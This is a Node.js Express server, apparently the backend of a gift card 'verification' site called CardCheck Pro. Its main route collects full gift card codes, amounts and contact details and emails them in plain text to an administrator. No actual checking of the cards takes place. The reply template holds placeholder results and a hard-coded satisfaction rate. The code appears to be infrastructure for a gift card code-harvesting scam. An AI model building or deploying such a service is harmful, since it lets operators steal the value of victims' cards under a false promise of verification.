
const express = require('express');
const nodemailer = require('nodemailer');
const cors = require('cors');
const rateLimit = require('express-rate-limit');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3001;

// 🔧 CONFIGURATION CORS CORRIGÉE - AUTORISATION EXPLICITE DE CHECKCARDPRO.COM
app.use(cors({
  origin: [
    'https://checkcardpro.com',
    'http://localhost:3000', 
    'https://votre-site.vercel.app',
    process.env.FRONTEND_URL
  ].filter(Boolean),
  credentials: true,
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization', 'Origin', 'Accept'],
  optionsSuccessStatus: 200
}));

app.use(express.json({ limit: '10mb' }));

// Protection contre le spam
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // limite à 5 soumissions par IP toutes les 15 minutes
  message: { error: 'Trop de demandes. Veuillez réessayer dans 15 minutes.' }
});

app.use('/api/verify-card', limiter);

// Configuration de l'email transporter
const transporter = nodemailer.createTransport({
  service: 'gmail', // ou votre service email préféré
  auth: {
    user: process.env.EMAIL_USER, // votre email
    pass: process.env.EMAIL_PASS  // mot de passe d'application
  }
});

// Vérification de la configuration email au démarrage
transporter.verify((error, success) => {
  if (error) {
    console.log('❌ Erreur configuration email:', error);
  } else {
    console.log('✅ Configuration email validée');
  }
});

// Route pour recevoir les demandes de vérification
app.post('/api/verify-card', async (req, res) => {
  try {
    const {
      clientEmail,
      clientPhone,
      cardType,
      cardLabel,
      amount,
      currency,
      currencySymbol,
      codes,
      language,
      timestamp
    } = req.body;

    // Validation des données
    if (!clientEmail || !cardType || !amount || !codes.code1) {
      return res.status(400).json({ 
        error: 'Données manquantes',
        success: false 
      });
    }

    // Formatage de la date
    const formattedDate = new Date(timestamp).toLocaleString('fr-FR', {
      year: 'numeric',
      month: 'long',
      day: 'numeric',
      hour: '2-digit',
      minute: '2-digit'
    });

    // Génération de l'ID de référence
    const referenceId = `VF${Date.now().toString(36).toUpperCase()}${Math.random().toString(36).substr(2, 4).toUpperCase()}`;

    // Construction de l'email à recevoir par l'administrateur
    const adminEmailContent = `
    📧 NOUVELLE DEMANDE DE VÉRIFICATION DE CARTE CADEAU
    ═══════════════════════════════════════════════════════════

    🆔 RÉFÉRENCE: ${referenceId}
    📅 DATE: ${formattedDate}
    🌐 LANGUE: ${language.toUpperCase()}

    👤 INFORMATIONS CLIENT:
    ═══════════════════════════
    📧 Email: ${clientEmail}
    📱 Téléphone: ${clientPhone || 'Non fourni'}

    💳 CARTE À VÉRIFIER:
    ═══════════════════════════
    🎯 Type: ${cardLabel} (${cardType})
    💰 Montant: ${amount} ${currencySymbol}
    💱 Devise: ${currency}

    🔐 CODES À VÉRIFIER:
    ═══════════════════════════
    📝 Code 1 (principal): ${codes.code1}
    📝 Code 2: ${codes.code2 || 'Non fourni'}
    📝 Code 3: ${codes.code3 || 'Non fourni'}
    📝 Code 4: ${codes.code4 || 'Non fourni'}

    ⚡ ACTIONS REQUISES:
    ═══════════════════════════
    1. ✅ Vérifier la validité des codes ci-dessus
    2. 💰 Vérifier le solde disponible
    3. 📅 Vérifier la date d'expiration
    4. 📧 Envoyer l'email de confirmation au client: ${clientEmail}

    💡 MODÈLE DE RÉPONSE POUR LE CLIENT:
    ═══════════════════════════════════════════
    Objet: Résultats de vérification - Référence ${referenceId}
    
    Bonjour,
    
    Nous avons vérifié votre carte ${cardLabel} d'un montant de ${amount} ${currencySymbol}.
    
    ✅ STATUT: [VALIDE/INVALIDE/PARTIELLEMENT UTILISÉE]
    💰 SOLDE DISPONIBLE: [XX ${currencySymbol}]
    📅 DATE D'EXPIRATION: [JJ/MM/AAAA]
    
    [Ajouter des instructions d'utilisation si nécessaire]
    
    Cordialement,
    L'équipe CardCheck Pro
    ═══════════════════════════════════════════

    ⚠️  IMPORTANT: Répondez rapidement au client pour maintenir la confiance.
    
    📊 STATISTIQUES:
    - Temps de traitement recommandé: < 2 heures
    - Taux de satisfaction: 98.5%
    `;

    // Options de l'email admin
    const adminMailOptions = {
      from: process.env.EMAIL_USER,
      to: process.env.ADMIN_EMAIL || process.env.EMAIL_USER,
      subject: `🔐 [${cardLabel}] Vérification ${amount}${currencySymbol} - ${clientEmail}`,
      text: adminEmailContent,
      html: adminEmailContent.replace(/\n/g, '<br>').replace(/═/g, '─')
    };

    // Envoi de l'email à l'administrateur
    await transporter.sendMail(adminMailOptions);

    // Log pour le développement
    console.log('\n' + '='.repeat(60));
    console.log('📧 NOUVELLE DEMANDE DE VÉRIFICATION REÇUE');
    console.log('='.repeat(60));
    console.log(`📅 ${formattedDate}`);
    console.log(`🆔 Référence: ${referenceId}`);
    console.log(`👤 Client: ${clientEmail}`);
    console.log(`💳 Carte: ${cardLabel} - ${amount} ${currencySymbol}`);
    console.log(`🔐 Codes: ${codes.code1}${codes.code2 ? ', ' + codes.code2 : ''}${codes.code3 ? ', ' + codes.code3 : ''}${codes.code4 ? ', ' + codes.code4 : ''}`);
    console.log('='.repeat(60));

    // Réponse de succès
    res.json({ 
      success: true, 
      message: 'Demande reçue avec succès',
      reference: referenceId
    });

  } catch (error) {
    console.error('❌ Erreur lors de l\'envoi de l\'email:', error);
    res.status(500).json({ 
      error: 'Erreur serveur lors de l\'envoi',
      success: false 
    });
  }
});

// Route de santé pour vérifier que le serveur fonctionne
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Serveur de vérification de cartes opérationnel',
    timestamp: new Date().toISOString()
  });
});

// Route pour les statistiques (optionnel)
app.get('/api/stats', (req, res) => {
  res.json({
    message: 'Statistiques du serveur',
    uptime: process.uptime(),
    version: '1.0.0',
    environment: process.env.NODE_ENV || 'development'
  });
});

// Gestion des erreurs 404
app.use('*', (req, res) => {
  res.status(404).json({ 
    error: 'Route non trouvée',
    success: false 
  });
});

// Gestion globale des erreurs
app.use((error, req, res, next) => {
  console.error('❌ Erreur serveur:', error);
  res.status(500).json({ 
    error: 'Erreur interne du serveur',
    success: false 
  });
});

// Démarrage du serveur
app.listen(PORT, () => {
  console.log('\n🚀 SERVEUR CARDCHECK PRO DÉMARRÉ');
  console.log('='.repeat(40));
  console.log(`📡 Port: ${PORT}`);
  console.log(`🌍 Environnement: ${process.env.NODE_ENV || 'development'}`);
  console.log(`📧 Email configuré: ${process.env.EMAIL_USER ? '✅' : '❌'}`);
  console.log(`🔐 Variables d'env: ${process.env.EMAIL_USER ? 'OK' : 'MANQUANTES'}`);
  console.log(`🌐 CORS configuré pour: https://checkcardpro.com`);
  console.log('='.repeat(40));
  console.log(`📍 Santé: http://localhost:${PORT}/api/health`);
  console.log(`📊 Stats: http://localhost:${PORT}/api/stats`);
  console.log('\n✅ Prêt à recevoir les demandes de vérification!\n');
});

// Gestion propre de l'arrêt du serveur
process.on('SIGTERM', () => {
  console.log('🛑 Arrêt du serveur...');
  process.exit(0);
});

process.on('SIGINT', () => {
  console.log('\n🛑 Arrêt du serveur (Ctrl+C)...');
  process.exit(0);
});
